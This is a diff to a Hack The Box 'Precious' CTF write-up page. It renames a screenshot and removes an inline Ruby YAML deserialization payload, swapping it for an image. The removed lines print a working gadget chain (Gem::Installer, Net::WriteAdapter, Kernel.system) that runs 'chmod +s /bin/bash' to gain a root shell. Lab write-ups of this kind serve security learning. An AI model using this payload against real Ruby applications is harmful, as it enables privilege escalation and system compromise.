@@ -130,7 +130,7 @@
             <br>Started a ssh-session as henry and got the user flag.
             </p>
             <br>
-            <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS5s.png" alt="website" class="center">
+            <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS5.png" alt="website" class="center">
             <br>
             <br>
             <p>
@@ -157,7 +157,10 @@
             <br> However, I wanted root-shell! I cant do shit in ruby, but I know that "FileRead"-Functions can be abused for arbitary command execution in various programming languages.
             <br> Searching the Internet I found following article: <a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/" > https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/ </a>. Looked promissing, so I came up with following scipt:
             <br> So I wrote the following inside of dependencies.yml:
-            <p> <md> ---<br>- !ruby/object:Gem::Installer<br> i: x<br>- !ruby/object:Gem::SpecFetcher<br> i: y<br>- !ruby/object:Gem::Requirement<br> requirements:<br> !ruby/object:Gem::Package::TarReader<br> io: &amp;1 !ruby/object:Net::BufferedIO<br> io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry<br> read: 0<br> header: &quot;abc&quot;<br> debug_output: &amp;1 !ruby/object:Net::WriteAdapter<br> socket: &amp;1 !ruby/object:Gem::RequestSet<br> sets: !ruby/object:Net::WriteAdapter<br> socket: !ruby/module 'Kernel'<br> method_id: :system<br> git_set: chmod +s /bin/bash<br> method_id: :resolve </md> </p>
+            <br>
+            <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS9.png" alt="website" class="center">
+            <br>
+            <br>
             </p>
             <h3>== Run for the flag ==</h3>
             </p>
